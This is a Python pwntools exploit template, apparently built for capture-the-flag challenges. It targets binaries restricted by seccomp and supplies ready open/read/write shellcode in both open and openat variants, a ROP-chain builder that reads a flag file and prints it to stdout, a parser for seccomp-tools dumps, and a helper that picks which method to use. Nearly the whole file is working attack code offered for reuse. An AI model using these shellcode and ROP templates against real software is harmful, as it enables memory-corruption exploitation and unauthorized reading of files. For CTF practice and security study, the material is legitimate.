#!/usr/bin/env python3
"""
seccomp_orw.py -- Open/Read/Write shellcode + ROP for seccomp-restricted binaries.

When `seccomp-tools dump ./binary` shows execve is blocked but open/read/write
are allowed, you can't pop a shell. Instead, read the flag file and write its
contents to stdout.

Workflow:
  1. Run `wsl seccomp-tools dump ./binary` (do this in Phase 0 — see reverser)
  2. Identify allowed syscalls. Common patterns:
       - openat allowed but open denied → use SYS_openat with AT_FDCWD
       - only read+write+exit → flag must already be open (fd 3?)
       - mmap+mprotect allowed → can write+exec shellcode
  3. Pick the matching template below

This file has both shellcode (sysrop ORW) and ROP-chain ORW templates.
"""
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6") if False else None  # set to ELF if provided

HOST, PORT = "1.2.3.4", 1337


def conn():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT)


# ===========================================================================
# Method 1: Pure shellcode ORW (when you can jump to a buffer)
# ===========================================================================
def shellcode_orw(filename="/flag\x00", out_size=0x100):
    """
    Open + read + write shellcode.
    Assumes amd64. For openat use SYS_openat (257) with rdi=-100 (AT_FDCWD).
    """
    sc = f"""
    /* open(rdi=&filename, rsi=0, rdx=0) */
    lea rdi, [rip + filename]
    xor esi, esi
    xor edx, edx
    mov eax, 2          /* SYS_open */
    syscall

    /* read(fd=rax, rsi=buf, rdx=size) */
    mov rdi, rax
    lea rsi, [rip + buf]
    mov edx, {out_size}
    xor eax, eax        /* SYS_read */
    syscall

    /* write(1, buf, rax) */
    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip + buf]
    mov eax, 1          /* SYS_write */
    syscall

    /* exit cleanly so seccomp doesn't trigger SIGSYS on a stray syscall */
    mov eax, 60         /* SYS_exit */
    xor edi, edi
    syscall

filename:
    .ascii "{filename}"
buf:
    .skip {out_size}
    """
    return asm(sc)


def shellcode_openat_orw(filename="flag\x00", out_size=0x100):
    """openat-only variant (when 'open' is blocked, common on newer kernels)."""
    sc = f"""
    lea rsi, [rip + filename]
    mov rdi, -100       /* AT_FDCWD */
    xor edx, edx
    mov eax, 257        /* SYS_openat */
    syscall

    mov rdi, rax
    lea rsi, [rip + buf]
    mov edx, {out_size}
    xor eax, eax
    syscall

    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip + buf]
    mov eax, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall

filename:
    .ascii "{filename}"
buf:
    .skip {out_size}
    """
    return asm(sc)


# ===========================================================================
# Method 2: ROP-chain ORW (when shellcode area isn't executable, NX on)
# ===========================================================================
def ropchain_orw(elf, libc_base, filename_addr, scratch_addr, out_size=0x100):
    """
    Build ORW ROP chain. Requires:
      - pop rdi/rsi/rdx gadgets (use ropper / pwn_ropgadget)
      - syscall gadget (libc has plenty: 'syscall ; ret')
      - filename string written somewhere first (use read() to write it)
    """
    rop = ROP([elf])
    if libc:
        rop.libc = libc
        rop.libc.address = libc_base

    # open(filename_addr, 0)
    rop.raw(rop.find_gadget(["pop rdi", "ret"]).address)
    rop.raw(filename_addr)
    rop.raw(rop.find_gadget(["pop rsi", "ret"]).address)
    rop.raw(0)
    rop.raw(rop.find_gadget(["pop rdx", "pop r12", "ret"]).address if rop.find_gadget(["pop rdx", "pop r12", "ret"]) else rop.find_gadget(["pop rdx", "ret"]).address)
    rop.raw(0)
    rop.raw(0)  # for r12 if pop rdx pop r12
    rop.raw(rop.find_gadget(["pop rax", "ret"]).address)
    rop.raw(2)  # SYS_open
    rop.raw(rop.find_gadget(["syscall", "ret"]).address)

    # read(3, scratch_addr, out_size)  -- assume open() returns fd 3
    rop.raw(rop.find_gadget(["pop rdi", "ret"]).address)
    rop.raw(3)
    rop.raw(rop.find_gadget(["pop rsi", "ret"]).address)
    rop.raw(scratch_addr)
    rop.raw(rop.find_gadget(["pop rdx", "ret"]).address)
    rop.raw(out_size)
    rop.raw(rop.find_gadget(["pop rax", "ret"]).address)
    rop.raw(0)  # SYS_read
    rop.raw(rop.find_gadget(["syscall", "ret"]).address)

    # write(1, scratch_addr, out_size)
    rop.raw(rop.find_gadget(["pop rdi", "ret"]).address)
    rop.raw(1)
    rop.raw(rop.find_gadget(["pop rsi", "ret"]).address)
    rop.raw(scratch_addr)
    rop.raw(rop.find_gadget(["pop rdx", "ret"]).address)
    rop.raw(out_size)
    rop.raw(rop.find_gadget(["pop rax", "ret"]).address)
    rop.raw(1)  # SYS_write
    rop.raw(rop.find_gadget(["syscall", "ret"]).address)

    return rop.chain()


# ===========================================================================
# Helpers
# ===========================================================================
def write_filename_via_read(io, dest_addr, filename=b"/flag\x00", read_gadget_setup=None):
    """
    Stage 1 of an ORW chain: drop "/flag\\0" into a writable address using
    a controlled read() call. Caller must already have a way to invoke read.
    """
    if read_gadget_setup:
        io.send(read_gadget_setup)
    io.send(filename + b"\x00" * (8 - len(filename) % 8))


def parse_seccomp_dump(dump_text: str) -> dict:
    """
    Parse output of `seccomp-tools dump ./binary` into a policy dict.
    Returns {'allowed': [...], 'denied': [...], 'mode': 'whitelist'/'blacklist'}.
    """
    allowed, denied = [], []
    for line in dump_text.splitlines():
        line = line.strip()
        if not line or line.startswith("="):
            continue
        # Lines look like:  0007: 0x06 0x00 0x00 0x7fff0000  ret ALLOW
        if "ALLOW" in line:
            for token in line.split():
                if token.startswith("SYS_") or token in ("read", "write", "open", "openat", "close", "exit", "exit_group", "mmap", "mprotect"):
                    allowed.append(token.replace("SYS_", ""))
        elif "KILL" in line or "ERRNO" in line:
            for token in line.split():
                if token.startswith("SYS_"):
                    denied.append(token.replace("SYS_", ""))
    return {
        "allowed": sorted(set(allowed)),
        "denied": sorted(set(denied)),
        "execve_blocked": "execve" not in allowed or "execve" in denied,
        "open_allowed": "open" in allowed or "openat" in allowed,
    }


# ===========================================================================
# Decision helper
# ===========================================================================
def pick_orw_method(seccomp_policy: dict, has_nx: bool, has_writable_exec: bool) -> str:
    """
    Pick which template to use based on environment.
    """
    if not seccomp_policy["execve_blocked"]:
        return "execve_shell"  # ORW not needed
    if not has_nx or has_writable_exec:
        if "openat" in seccomp_policy["allowed"]:
            return "shellcode_openat_orw"
        return "shellcode_orw"
    return "ropchain_orw"  # NX on, no executable buffer


if __name__ == "__main__":
    # Example
    # seccomp = parse_seccomp_dump(open("seccomp_dump.txt").read())
    # print(seccomp)
    # method = pick_orw_method(seccomp, has_nx=True, has_writable_exec=False)
    # print("Use:", method)
    pass
